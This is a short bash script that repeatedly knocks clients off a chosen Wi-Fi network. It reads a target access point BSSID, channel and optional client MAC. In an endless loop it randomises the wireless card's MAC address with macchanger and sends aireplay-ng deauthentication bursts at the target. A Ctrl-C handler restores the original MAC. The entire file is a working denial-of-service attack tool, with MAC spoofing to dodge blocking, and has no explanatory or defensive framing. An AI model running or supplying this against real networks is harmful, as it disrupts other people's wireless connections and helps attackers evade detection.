#!/bin/bash

echo -e -n "\e[92mEnter the BSSID : "
read bssid
echo -e -n "\e[93mEnter the Channel : "
read ch
echo -e -n "\e[93mEnter the Client MAC : "
read mac_cli
printf "\n"

while true; do
  trap ctrl_c INT

  function ctrl_c() {
        ifconfig wlan0 down
        echo -e -n "\e[0m \e[5m"
        printf "\n\nReverting back to original MAC Address\n"
        echo -e -n "\e[0m"
        echo -e -n "\e[33m"
        sudo macchanger -p wlan0 | grep "Permanent MAC"
        echo -e -n "\e[0m"
        iwconfig wlan0 mode managed
        ifconfig wlan0 up
        service NetworkManager restart
        printf "\nExiting in secs..\n"
        sleep 5
        exit
   }
  printf "\n"
  echo -e -n "\e[0m"
  echo "-----------------------------------------"
  echo -e -n "\e[91m"
  macchanger -s wlan0 | grep "Current MAC"
  echo -e -n "\e[97m"
  echo "-----------------------------------------"
  echo -e -n "\e[5m"
  echo "MAC Address changed..."
  echo -e -n "\e[0m"
  echo "-----------------------------------------"
  ifconfig wlan0 down
  echo -e -n "\e[36m"
  macchanger -r wlan0 | grep "New MAC"
  echo -e -n "\e[97m"
  ifconfig wlan0 up
  echo "-----------------------------------------"
  printf "\n\n"
  iwconfig wlan0 channel $ch
  echo -e -n "\e[95m"
  if [[ "$mac_cli" == "0" ]]
  then
     aireplay-ng -0 5 -a $bssid wlan0
  else
     aireplay-ng -0 5 -a $bssid -c $mac_cli wlan0
  fi     
  sleep 3
done  


